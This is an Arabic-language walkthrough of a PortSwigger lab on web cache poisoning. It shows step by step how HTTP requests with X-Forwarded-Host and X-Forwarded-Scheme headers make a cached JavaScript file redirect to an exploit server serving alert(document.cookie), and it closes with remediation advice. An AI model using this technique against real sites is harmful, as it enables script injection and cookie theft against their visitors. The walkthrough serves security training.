# [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(document.cookie)` في متصفح الضحية.
## **`خطوات الحل`**
إذا حاولنا إضافة ترويسة  `X-Forwarded-Host:` إلى الطلب الرئيسى للدخول إلى اللاب
```http
GET / HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
X-Forwarded-Host: example.com
```

سنلاحظ أنه لا يوجد اختلاف في الاستجابة ولم يتم عمل انعكاس لشئ.
لذلك سنقوم بإزالة `X-Forwarded-Host:` ونجرب وضع بدلًا منها ترويسة `X-Forwarded-Scheme` بقيمة `https`
```http
GET / HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
X-Forwarded-Scheme: https
```
وسنجد ان الاستجابة طبيعية ولكن عندما نغير قيمة ترويسة `X-Forwarded-Scheme` إلى أى شئ أخر غير `https`
```http
GET / HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
X-Forwarded-Scheme: nothttps
```
سنجد أن الاستجابة هي 
```http
HTTP/2 302 Found
Location: https://0af800d1044c345b805917a400ef0014.web-security-academy.net/
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```
وهذا يعنى أنه يتم عمل إعادة توجيه إلى الموقع بـ `https`، لذلك سنجرب الأن إعادة ترويسة `X-Forwarded-Host`
```http
GET / HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
X-Forwarded-Host: example.com
X-Forwarded-Scheme: nothttps
```
وستكون الاستجابة هي 
```http
HTTP/2 302 Found
Location: https://example.com/
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```
وهذا يعنى أنه يتم عمل إعادة توجيه بنجاح نحو `example.com`

والان سنبحث قليلًا في الـ `HTTP history` وسنجد هذا الطلب لملف `JS`
```http
GET /resources/js/tracking.js HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
Cookie: session=Fdlo7ckjagon0lLs1CrLkAiP2xQhn2vh

```
وسنجد أن استجابته يتم حفظها في ذاكرة التخزين المؤقت
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

والأن سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/resources/js/tracking.js` ونقوم بحقن `alert(document.cookie)` في حقل `Body` ونضغط `Store`

ثم نعود ونقوم بتغيير الطلب كالتالي
```http
GET /resources/js/tracking.js HTTP/2
Host: 0af800d1044c345b805917a400ef0014.web-security-academy.net
X-Forwarded-Host: exploit-0ab3009904a934e1803e162a01c0006e.exploit-server.net
X-Forwarded-Scheme: nothttps
```
وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وربما تحتاج لنسخ رابط الطلب أو الاستجابة من `Burp` لفتحه داخل المتصفح، وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
إذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسات `X-Forwarded-*` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

ويجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) القادمة من المستخدم (لأنها `User Input` يمكن التلاعب به)، وبدلاً من ذلك، يجب الاعتماد على متغير ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

ويجب الاعتماد على إعدادات السيرفر عند عمل إعادة توجيه `302 Redirect`، في حالات مثل إجبار المستخدم على استخدام `HTTPS` فيجب أن يستخدم التطبيق اسم النطاق الأصلي المخزن في إعداداته الثابتة، وعدم قراءة اسم النطاق من ترويسات الطلب.

وإذا كان النظام يعتمد على ترويسات التوجيه لتحديد بيئة العمل، فيجب التحقق من قيمتها برمجياً باستخدام `Whitelist` صارمة بالنطاقات المسموح بها فقط، ورفض أي نطاق خارجي.

ومن أفضل الحلول هنا هو تفعيل ترويسة الاستجابة `Strict-Transport-Security` التي تخبر متصفح المستخدم بأنه يجب عليه دائماً الاتصال بالموقع عبر `HTTPS` محلياً، دون الحاجة لإرسال طلب `HTTP` للسيرفر وانتظار إعادة توجيه `302`، حيث أن هذا يقلل من فرص التلاعب بإعادات التوجيه.

ويجب أن يشمل الترقيع والقوائم البيضاء الترويسات المشابهه تقوم بنفس الوظيفة، مثل: `X-Forwarded-Proto و X-Forwarded-Scheme و X-Host و Forwarded`.
